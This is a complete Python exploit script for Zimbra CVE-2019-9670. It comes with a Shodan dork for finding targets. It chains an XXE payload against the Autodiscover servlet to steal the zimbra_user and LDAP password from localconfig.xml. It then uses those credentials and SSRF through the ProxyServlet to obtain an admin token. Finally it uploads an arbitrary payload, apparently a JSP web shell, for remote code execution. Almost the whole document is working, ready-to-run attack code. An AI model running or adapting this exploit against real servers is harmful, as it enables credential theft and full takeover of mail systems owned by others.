#!/usr/bin/python3
# Title: Zimbra Autodiscover Servlet XXE and ProxyServlet SSRF <= 8.7.0 and 8.7.11
# Author: Raphael Karger
# Shodan Dork: 8.6.0_GA_1153
# Vendor Homepage: https://www.zimbra.com/
# Version: <= 8.7.0 and 8.7.11
# Tested on: Debian
# CVE : CVE-2019-9670
# References: 
# http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce
import requests
import sys
import urllib.parse
import re
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

banner = """
__________.__       ___.                  ___________________ ___________
\____    /|__| _____\_ |______________    \______   \_   ___ \\_   _____/
  /     / |  |/     \| __ \_  __ \__  \    |       _/    \  \/ |    __)_ 
 /     /_ |  |  Y Y  \ \_\ \  | \// __ \_  |    |   \     \____|        \\
/_______ \|__|__|_|  /___  /__|  (____  /  |____|_  /\______  /_______  /
        \/         \/    \/           \/          \/        \/        \/ 
"""

class zimbra_rce(object):
    def __init__(self, base_url, dtd_url, file_name, payload_file):
        self.base_url = base_url
        self.dtd_url = dtd_url
        self.low_auth = {}
        self.file_name = file_name
        self.payload = open(payload_file, "r").read()
        self.pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")

    def upload_dtd_payload(self):
        '''
        Example DTD payload:
            <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % end "]]>">
            <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
        '''
        xxe_payload = r"""<!DOCTYPE Autodiscover [
            <!ENTITY % dtd SYSTEM "{}">
            %dtd;
            %all;
            ]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
                <EMailAddress>aaaaa</EMailAddress>
                <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
            </Request>
        </Autodiscover>""".format(self.dtd_url)
        headers = {
            "Content-Type":"application/xml"
        }
        print("[*] Uploading DTD.", end="\r")
        dtd_request = requests.post(self.base_url+"/Autodiscover/Autodiscover.xml",data=xxe_payload,headers=headers,verify=False,timeout=15)
        # print(r.text)
        if 'response schema not available' not in dtd_request.text:
            print("[-] Site Not Vulnerable To XXE.")
            return False
        else:
            print("[+] Uploaded DTD.")
            print("[*] Attempting to extract User/Pass.", end="\r")
            pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            if pattern_name.findall(dtd_request.text) and pattern_password.findall(dtd_request.text):
                username = pattern_name.findall(dtd_request.text)[0][2]
                password = pattern_password.findall(dtd_request.text)[0][2]
                self.low_auth = {"username" : username, "password" : password}
                print("[+] Extracted Username: {} Password: {}".format(username, password))
                return True
            print("[-] Unable To extract User/Pass.")
        return False

    def make_xml_auth_body(self, xmlns, username, password):
        auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
            <context xmlns="urn:zimbra">
                <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
            </context>
        </soap:Header>
        <soap:Body>
            <AuthRequest xmlns="{}">
                <account by="adminName">{}</account>
                <password>{}</password>
            </AuthRequest>
        </soap:Body>
        </soap:Envelope>"""
        return auth_body.format(xmlns, username, password)

    def gather_low_auth_token(self):
        print("[*] Getting Low Privilege Auth Token", end="\r")
        headers = {
            "Content-Type":"application/xml"
        }
        r=requests.post(self.base_url+"/service/soap",data=self.make_xml_auth_body(
            "urn:zimbraAccount", 
            self.low_auth["username"], 
            self.low_auth["password"]
        ), headers=headers, verify=False, timeout=15)
        low_priv_token = self.pattern_auth_token.findall(r.text)
        if low_priv_token:
            print("[+] Gathered Low Auth Token.")
            return low_priv_token[0].strip()
        print("[-] Failed to get Low Auth Token")
        return False

    def ssrf_admin_token(self, low_priv_token):
        headers = {
            "Content-Type":"application/xml"
        }
        headers["Host"]="{}:7071".format(urllib.parse.urlparse(self.base_url).netloc.split(":")[0])
        print("[*] Getting Admin Auth Token By SSRF", end="\r")
        r = requests.post(self.base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap/AuthRequest",
        data=self.make_xml_auth_body(
            "urn:zimbraAdmin", 
            self.low_auth["username"], 
            self.low_auth["password"]
        ),
            verify=False, 
            headers=headers,
            cookies={"ZM_ADMIN_AUTH_TOKEN":low_priv_token}
        )
        admin_token = self.pattern_auth_token.findall(r.text)
        if admin_token:
            print("[+] Gathered Admin Auth Token.")
            return admin_token[0].strip()
        print("[-] Failed to get Admin Auth Token")
        return False

    def upload_payload(self, admin_token):
        f = {
            'filename1':(None, "whateverlol", None),
            'clientFile':(self.file_name, self.payload, "text/plain"),
            'requestId':(None, "12", None),
        }
        cookies = {
            "ZM_ADMIN_AUTH_TOKEN":admin_token
        }
        print("[*] Uploading file", end="\r")
        r = requests.post(self.base_url+"/service/extension/clientUploader/upload",files=f,
            cookies=cookies, 
            verify=False
        )
        if r.status_code == 200:
            r = requests.get(self.base_url + "/downloads/" + self.file_name,
                cookies=cookies, 
                verify=False
            )
            if r.status_code == 200: # some jsp shells throw a 500 if invalid parameters are given
                print("[+] Uploaded file to: {}/downloads/{}".format(self.base_url, self.file_name))
                print("[+] You may need the need cookie: \n{}={};".format("ZM_ADMIN_AUTH_TOKEN", cookies["ZM_ADMIN_AUTH_TOKEN"]))
                return True
        print("[-] Cannot Upload File.")
        return False

    def exploit(self):
        try:
            if self.upload_dtd_payload():
                low_auth_token = self.gather_low_auth_token()
                if low_auth_token:
                    admin_auth_token = self.ssrf_admin_token(low_auth_token)
                    if admin_auth_token:
                        return self.upload_payload(admin_auth_token)
        except Exception as e:
            print("Error: {}".format(e))
        return False

if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(description='Zimbra RCE CVE-2019-9670')
    parser.add_argument('-u', '--url', action='store', dest='url',
                    help='Target url', required=True)
    parser.add_argument('-d', '--dtd', action='store', dest='dtd',
                    help='Url to DTD', required=True)
    parser.add_argument('-n', '--name', action='store', dest='payload_name',
                    help='Name of uploaded payload', required=True)
    parser.add_argument('-f', '--file', action='store', dest='payload_file',
                    help='File containing payload', required=True)
    results = parser.parse_args()
    z = zimbra_rce(results.url, results.dtd, results.payload_name, results.payload_file)
    z.exploit()